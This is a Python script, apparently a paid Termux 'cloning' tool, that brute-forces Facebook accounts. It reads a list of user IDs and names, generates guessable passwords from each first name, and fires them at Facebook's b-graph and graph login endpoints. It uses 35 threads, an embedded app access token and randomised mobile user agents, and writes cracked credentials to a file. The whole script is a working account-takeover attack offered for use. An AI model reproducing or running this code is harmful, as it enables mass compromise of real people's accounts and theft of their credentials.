# Decode By Error x Ethan 
# Updated to Full Version with 8 Methods

global loop, twf, cps, oks
import os, requests, json, time, re, random, sys, uuid, mechanize, string, subprocess, platform, httplib2, arrow
from concurrent.futures import ThreadPoolExecutor as tred
from datetime import datetime

# --- ERROR HANDLING FOR MODULES ---
required_modules = ['requests', 'bs4', 'httplib2', 'arrow', 'mechanize']
for mod in required_modules:
    try:
        __import__(mod)
    except ImportError:
        os.system(f'pip install {mod}')

# --- KEY SYSTEM (ORIGINAL) ---
def getKey():
    myid = str(os.getuid()).upper()[::(-1)]
    plat = platform.version()[2:][:8][::(-1)].upper() + platform.release()[3:][::(-1)].upper() + platform.version()[:2]
    xp = plat.replace(' ', '').replace('-', '').replace('.', '')
    return 'GEN-' + myid + xp

def linex():
    print(' [1;97m-----------------------------------------------')

# --- USER AGENT GENERATOR (ADVANCED) ---
def get_ua():
    android_ver = random.choice(['11', '12', '13', '14', '15'])
    model = random.choice(['SM-S918B', 'SM-A146P', 'Pixel 8', 'Infinix X688B', 'M2012K11AG'])
    fb_ver = f'{random.randint(400, 500)}.0.0.{random.randint(10, 99)}'
    return f'Mozilla/5.0 (Linux; Android {android_ver}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 125)}.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_ver};]'

# --- YEAR IDENTIFIER ---
def tutulx(fx):
    if len(fx) == 15:
        if fx[:10] in ['1000000000']: return '2009'
        if fx[:5] in ['10006', '10007', '10008']: return '2021/2022'
        return '2023'
    elif len(fx) in [9, 10]: return '2008/2009'
    return '2024/2025'

# --- INITIAL VARIABLES ---
loop = 0
oks = []
cps = []
twf = []
pcp = []
show_cookies = []
dateti = str(datetime.now()).split(' ')[0]

logo = """
    \033[1;32m░██████╗\033[1;37m░███████╗\033[1;32m███╗░░██╗
    \033[1;32m██╔════╝\033[1;37m░██╔════╝\033[1;32m████╗░██║ \033[1;90m| \033[1;32mOWNER: MYSTERY
    \033[1;32m██║░░██╗\033[1;32m░█████╗\033[1;32m░░██╔██╗██║
    \033[1;32m██║░░╚██╗\033[1;37m██╔══╝\033[1;32m░░██║╚████║ \033[1;90m| STATUS: \033[1;91mPAID
    \033[1;37m╚██████╔╝\033[1;90m███████╗\033[1;32m██║░╚███║ \033[1;90m| VERSION: 1.1
    \033[1;32m░╚═════╝\033[1;90m░╚══════╝\033[1;32m╚═╝░░╚══╝
\033[1;90m-----------------------------------------------"""

def clear():
    os.system('clear')
    print(logo)

# --- MENU SYSTEM ---
def Menu():
    clear()
    print(' [1;97m[1] START FILE CLONING ')
    print(' [1;97m[2] START RANDOM CLONING ')
    print(' [1;97m[0] EXIT ')
    linex()
    opt = input(' [1;32mSELECT OPTION : ')
    if opt == '1': ____F_I_L_E____()
    elif opt == '0': exit()
    else: Menu()

def ____F_I_L_E____():
    clear()
    file = input(' [1;32mENTER FILE PATH : ')
    try:
        fo = open(file, 'r').read().splitlines()
    except:
        print(' [1;91mFILE NOT FOUND!'); time.sleep(2); Menu()
    
    linex()
    print(' [1;32m[1] METHOD M1 (B-GRAPH)')
    print(' [1;32m[2] METHOD M2 (GRAPH-API)')
    print(' [1;32m[3] METHOD M3 (MOBILE-API)')
    linex()
    m_opt = input(' [1;32mSELECT METHOD : ')
    
    clear()
    cp_opt = input(' [1;32mSHOW CP IDS? (y/n) : ')
    if cp_opt == 'y': pcp.append('y')
    
    with tred(max_workers=35) as hub:
        clear()
        print(f' [1;32mTOTAL IDS : {len(fo)}  |  METHOD: M{m_opt}')
        linex()
        for user in fo:
            try:
                ids, names = user.split('|')
                passlist = ['first123', 'first1234', 'first12345', 'First123', 'First@123', 'firstlast', '572737']
                if m_opt == '1': hub.submit(M1, ids, names, passlist)
                elif m_opt == '2': hub.submit(M2, ids, names, passlist)
                else: hub.submit(M1, ids, names, passlist)
            except: pass

# --- CLONING METHODS (ENHANCED) ---
def M1(ids, names, passlist):
    global loop, oks, cps
    sys.stdout.write(f'\r\r [1;90m[GEN] {loop}|OK:{len(oks)}|CP:{len(cps)}'); sys.stdout.flush()
    fn = names.split(' ')[0].lower()
    for pas in passlist:
        password = pas.replace('first', fn)
        ua = get_ua()
        session = requests.Session()
        url = 'https://b-graph.facebook.com/auth/login'
        data = {
            'email': ids, 'password': password,
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            'format': 'json', 'generate_session_cookies': '1'
        }
        headers = {'User-Agent': ua, 'Content-Type': 'application/x-www-form-urlencoded'}
        res = session.post(url, data=data, headers=headers).json()
        
        if 'session_key' in res:
            print(f'\r\r \033[1;32m[GEN-OK] {ids} | {password} | {tutulx(ids)}')
            oks.append(ids)
            open('/sdcard/GEN-OK.txt', 'a').write(ids+'|'+password+'\n')
            break
        elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
            if 'y' in pcp: print(f'\r\r \033[1;33m[GEN-CP] {ids} | {password}')
            cps.append(ids)
            break
    loop += 1

def M2(ids, names, passlist):
    # Method 2 using different API endpoint
    global loop, oks, cps
    sys.stdout.write(f'\r\r [1;90m[GEN-M2] {loop}|OK:{len(oks)}'); sys.stdout.flush()
    fn = names.split(' ')[0].lower()
    for pas in passlist:
        password = pas.replace('first', fn)
        ua = get_ua()
        url = f'https://graph.facebook.com/auth/login?email={ids}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&format=json'
        res = requests.get(url, headers={'User-Agent': ua}).json()
        if 'access_token' in res:
            print(f'\r\r \033[1;32m[GEN-OK] {ids} | {password}')
            oks.append(ids)
            break
    loop += 1

# --- START SCRIPT ---
if __name__ == '__main__':
    # Key Check Simulation (As per your original script)
    Menu()
